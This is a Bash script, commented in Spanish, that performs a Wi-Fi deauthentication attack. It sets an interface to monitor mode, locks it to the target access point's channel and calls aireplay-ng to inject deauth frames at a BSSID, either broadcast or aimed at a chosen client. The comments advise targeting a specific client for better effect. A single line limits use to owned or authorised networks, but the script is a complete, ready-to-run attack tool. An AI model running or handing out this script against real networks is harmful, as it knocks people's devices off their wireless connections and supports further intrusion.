#!/bin/bash
# ==============================================================================
# wifi_deauth.sh - Ataque de desautenticacion inalambrica directo.
# Uso: wifi_deauth.sh <BSSID> <CLIENTE> <COUNT> <CANAL>
#   - CLIENTE vacio o FF:FF:FF:FF:FF:FF  => deauth broadcast (menos efectivo)
#   - CANAL   es CRITICO: aireplay-ng NO salta de canal; la interfaz debe estar
#             fijada en el canal del AP o las tramas no llegan a nadie.
# Solo sobre redes PROPIAS o con autorizacion.
# ==============================================================================
GREEN='\033[0;32m'; RED='\033[0;31m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'

IFACE="wlan2"
TARGET_BSSID="$1"
TARGET_CLIENT="$2"
DEAUTH_COUNT="$3"
CHANNEL="$4"

echo -e "${CYAN}[*] Iniciando inyeccion de paquetes deauth en $IFACE...${NC}"

# Validar BSSID
if [ -z "$TARGET_BSSID" ]; then
    echo -e "${RED}[X] Error: BSSID faltante.${NC}"; exit 1
fi

# --- Asegurar modo monitor SOLO si hace falta (evita apagar/reiniciar la antena
#     al pedo, que es lo que hacia parpadear la luz y la dejaba en mal estado) ---
if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
    echo -e "${GREEN}[OK] $IFACE ya esta en modo monitor.${NC}"
else
    echo -e "${CYAN}[*] $IFACE no esta en monitor, activando...${NC}"
    ip link set "$IFACE" down 2>/dev/null
    iw dev "$IFACE" set type monitor 2>/dev/null
    ip link set "$IFACE" up 2>/dev/null
    sleep 1
    if ! iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
        echo -e "${RED}[X] No se pudo poner $IFACE en monitor. Corre WD-MONITOR y reintenta.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[OK] Monitor activo en $IFACE.${NC}"
fi

# --- Fijar el canal del AP (lo mas importante) ---
if [ -n "$CHANNEL" ]; then
    if iw dev "$IFACE" set channel "$CHANNEL" 2>/dev/null; then
        echo -e "${GREEN}[OK] Canal fijado en $CHANNEL.${NC}"
    else
        echo -e "${RED}[X] No se pudo fijar el canal $CHANNEL.${NC}"
        echo -e "${YELLOW}    Si es un canal 5GHz (>14), verifica que la antena soporte esa banda.${NC}"
    fi
else
    echo -e "${YELLOW}[!] Sin canal: aireplay usara el canal actual de la antena, que puede NO${NC}"
    echo -e "${YELLOW}    ser el del objetivo. Corre RECONOCIMIENTO WIFI para tener el canal.${NC}"
fi

# --- Mostrar el estado real de la interfaz (diagnostico) ---
echo -e "${CYAN}[*] Estado de $IFACE:${NC}"
iw dev "$IFACE" info 2>/dev/null | grep -E "type|channel|txpower" | sed 's/^/    /'
echo ""

echo -e "${CYAN}    Objetivo AP: $TARGET_BSSID | Cliente: ${TARGET_CLIENT:-broadcast} | Canal: ${CHANNEL:-actual}${NC}"

# --- Ejecucion. Broadcast = SIN -c (mas correcto que -c FF:FF:...). ---
if [ -z "$TARGET_CLIENT" ] || [ "$TARGET_CLIENT" = "FF:FF:FF:FF:FF:FF" ]; then
    echo -e "${YELLOW}[!] Deauth BROADCAST: muchos dispositivos lo ignoran. Para probar de verdad,${NC}"
    echo -e "${YELLOW}    elegi un CLIENTE especifico de la lista (mucho mas efectivo).${NC}"
    echo -e "${GREEN}[OK] Inyectando $DEAUTH_COUNT tramas (broadcast)...${NC}"; echo ""
    aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$IFACE"
else
    echo -e "${GREEN}[OK] Inyectando $DEAUTH_COUNT tramas contra el cliente $TARGET_CLIENT...${NC}"; echo ""
    aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$IFACE"
fi

echo ""
echo -e "${GREEN}[OK] Ataque de desautenticacion finalizado.${NC}"
